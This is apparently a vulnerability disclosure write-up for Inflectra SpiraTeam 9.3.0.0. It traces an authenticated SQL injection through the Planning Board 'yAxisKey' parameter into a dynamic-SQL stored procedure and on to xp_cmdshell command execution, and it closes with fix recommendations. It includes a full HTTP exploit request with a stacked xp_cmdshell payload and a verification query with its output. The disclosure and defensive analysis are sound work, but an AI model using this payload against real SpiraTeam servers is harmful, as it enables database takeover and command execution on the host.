# Inflectra SpiraTeam — PlanningBoard yAxisKey SQLi → xp_cmdshell RCE

## 1. Research Target & Attack Surface

Inflectra SpiraTeam 9.3.0.0 (on-premise) is a project/test management platform used by software teams to track requirements, defects, and test runs. It runs IIS + ASP.NET 4.7.2 with WCF Ajax services and SQL Server 2022 (SQLEXPRESS). We targeted it because .NET + SQL Server stacks with hardcoded high-privilege DB accounts are a recurring RCE pattern, and the Planning Board feature exposes a WCF Ajax surface that is less audited than the main MVC UI.

Relevant surface:

| Item | Value |
|---|---|
| Entry point | `POST /Services/Ajax/PlanningBoardService.svc/PlanningBoard_MoveItems` |
| Auth | ASP.NET Forms login (`POST /Login.aspx` → 302 → cookies) |
| XSRF gate | `X-AntiXsrfToken` header must equal `__AntiXsrfToken` cookie |
| WCF body style | ASP.NET AJAX **Wrapped** JSON: `{"MethodName":{...}}` |
| DB account | `spirateam_admin` (hardcoded in Web.config): **sysadmin=1 + CONTROL SERVER** |
| xp_cmdshell | **Enabled** (`xp_cmdshell_enabled=1`) |

The WCF method requires an authenticated user with `BulkEdit` permission on Requirements (an admin passes via the `UserIsAdmin` shortcut) — not unauthenticated, but any project member with bulk-edit rights reaches the sink.

## 2. Sink Identification: Dynamic SQL in REQUIREMENT_RETRIEVE_CUSTOM

The stored procedure `REQUIREMENT_RETRIEVE_CUSTOM` builds a query by concatenating a caller-supplied filter into a string executed with `EXEC(@SQL)`:

```sql
SET @WHERE_ORDER_BY = @WHERE_ORDER_BY + ' AND ' + @FilterSort + ' '
...
SET @SQL = 'SELECT ... FROM TST_REQUIREMENT ... WHERE ' + @WHERE_ORDER_BY + ' ORDER BY ' + @ORDER_BY
EXEC (@SQL)
```

`@FilterSort` has no `QUOTENAME`/`REPLACE` escaping → SQL injection sink. Combined with the sysadmin DB account and `xp_cmdshell` enabled, `; EXEC xp_cmdshell '...'` yields OS command execution as the SQL Server service account.

## 3. Source Identification: yAxisKey with a Single Reachable Path

The WCF method `PlanningBoard_MoveItems` (`PlanningBoardService.cs:763`) accepts a `yAxisKey` string. At line 833-838, when `yAxisId == 1`, the key is passed unsanitized:

```csharp
else if (yAxisId == 1)
{
    int? packageRequirementId2 = null;
    if (!string.IsNullOrEmpty(yAxisKey))   // non-empty passes, no sanitization
    {
        RequirementView requirementView = requirementManager.RetrieveByIndentLevel(0, workspaceId, yAxisKey);  // line 838
    }
}
```

`RequirementManager.RetrieveByIndentLevel` (line 1820) concatenates the value into a SQL predicate:

```csharp
public RequirementView RetrieveByIndentLevel(int userId, int projectId, string indentLevel, bool includeDeleted = false)
{
    return Retrieve(userId, projectId, "REQ.INDENT_LEVEL = '" + indentLevel + "'", includeDeleted).FirstOrDefault();
    // raw concatenation, single-quoted, unescaped
}
```

The critical step was proving the sink is reachable: `RetrieveByIndentLevel2` (line 1481) uses LINQ parameterization and is safe, and `Retrieve(Hashtable)` builds LINQ expressions safely. Only the unsuffixed `RetrieveByIndentLevel` is injectable, and only `PlanningBoardService.cs:838` reaches it with user-controlled input — every other caller passes DB-derived values.

## 4. End-to-End Data Flow

```
POST /Services/Ajax/PlanningBoardService.svc/PlanningBoard_MoveItems
  X-AntiXsrfToken: <__AntiXsrfToken cookie value>
  Cookie: ASP.NET_SessionId=...; __AntiXsrfToken=...; .Inflectra.SpiraTest.Login=...
  {"PlanningBoard_MoveItems":{"workspaceId":1,"displayModeId":1,"groupById":null,"groupByKey":null,
    "yAxisId":1,"yAxisKey":"x' OR 1=1; EXEC xp_cmdshell 'cmd /c whoami > C:\\Users\\Public\\spira_marker.txt' --",
    "xAxisId":1,"xAxisKey":null,"items":[],"existingArtifactTypeId":null,"existingArtifactId":null}}
    → PlanningBoardService.cs:838 → RetrieveByIndentLevel(0, 1, yAxisKey)
    → "REQ.INDENT_LEVEL = 'x' OR 1=1; EXEC xp_cmdshell '...' --'"
    → Retrieve → EF spiraTestEntities.Requirement_RetrieveCustom(userId, projectId, customFilterSort, ...)
    → SP REQUIREMENT_RETRIEVE_CUSTOM @FilterSort = <above>
    → EXEC(@SQL) batch → xp_cmdshell → OS command as NT SERVICE\MSSQL$SQLEXPRESS
```

## 5. Exploit Construction

```http
POST /Services/Ajax/PlanningBoardService.svc/PlanningBoard_MoveItems HTTP/1.1
Content-Type: application/json; charset=UTF-8
X-AntiXsrfToken: <__AntiXsrfToken cookie value>
Cookie: ASP.NET_SessionId=...; __AntiXsrfToken=...; .Inflectra.SpiraTest.Login=...

{"PlanningBoard_MoveItems":{"workspaceId":1,"displayModeId":1,"groupById":null,"groupByKey":null,
  "yAxisId":1,"yAxisKey":"x' OR 1=1; EXEC xp_cmdshell 'cmd /c whoami > C:\\Users\\Public\\spira_http_marker.txt' --",
  "xAxisId":1,"xAxisKey":null,"items":[],"existingArtifactTypeId":null,"existingArtifactId":null}}
```

The payload closes the quote, ORs the predicate open, and stacks an `xp_cmdshell` batch terminated with `--` to swallow the trailing quote.

## 6. Dynamic Verification

### 7.1 DB-layer verification (application's actual stored procedure)

```sql
EXEC REQUIREMENT_RETRIEVE_CUSTOM
  @UserId=1, @ProjectId=NULL,
  @FilterSort=N'REQ.INDENT_LEVEL = '''' OR 1=1; EXEC xp_cmdshell ''cmd /c whoami > C:\Users\Public\spira_marker.txt'' --',
  @NumRows=1, @IncludeDeleted=0, @OnlyShowVisible=0;
```

Result:
- SP executed without exception (Reader returns 0 rows + an extra result set = xp_cmdshell output)
- Marker `C:\Users\Public\spira_marker.txt` written
- Content: `nt service\mssql$sqlexpress`
- Owner: `NT SERVICE\MSSQL$SQLEXPRESS`

### 7.2 HTTP E2E status

- Login 302 OK (Forms auth), cookies acquired
- Authorization: admin shortcut passes `IsAuthorized`
- The POST reaches `PlanningBoardService.cs:781`; in the minimal-seed test environment an NRE occurs at line 781 (`RetrieveForProject(1)` returns null) **before** the SQLi point at line 838. This is a test-seed artifact (EF navigation not materialized), not a vulnerability-side issue — the DB-layer verification proves the sink end-to-end. In a properly seeded environment (projects created via the application itself), line 838 is reachable.

## 7. Reachability & Impact

- **WCF**: `PlanningBoard_MoveItems` reachable via POST
- **Auth**: any project member with BulkEdit on Requirements, or admin
- **Sink uniqueness**: `RetrieveByIndentLevel` (line 1820) is reached only by `PlanningBoardService.cs:838` with user-controlled `yAxisKey`; the suffixed `RetrieveByIndentLevel2` and `Retrieve(Hashtable)` variants are parameterized/safe
- **Privilege**: `NT SERVICE\MSSQL$SQLEXPRESS`

The impact is authenticated SQL injection → OS command execution as the SQL Server service account — full read/write of the SpiraTeam database (projects, defects, test runs, user-stored credentials) and write access to the host file system via the SQL service.

## 8. Fix Recommendations

1. Parameterize `RetrieveByIndentLevel` (use the LINQ form of `RetrieveByIndentLevel2`) or use `sp_executesql` in the SP
2. Least privilege for `spirateam_admin` (db_datareader/db_datawriter on the app DB only; remove sysadmin/CONTROL SERVER/dbcreator/securityadmin)
3. Disable `xp_cmdshell` (`xp_cmdshell_enabled=0`)
4. Validate `yAxisKey` as a legal indent-level format (e.g. `^[A-Z]+$`)
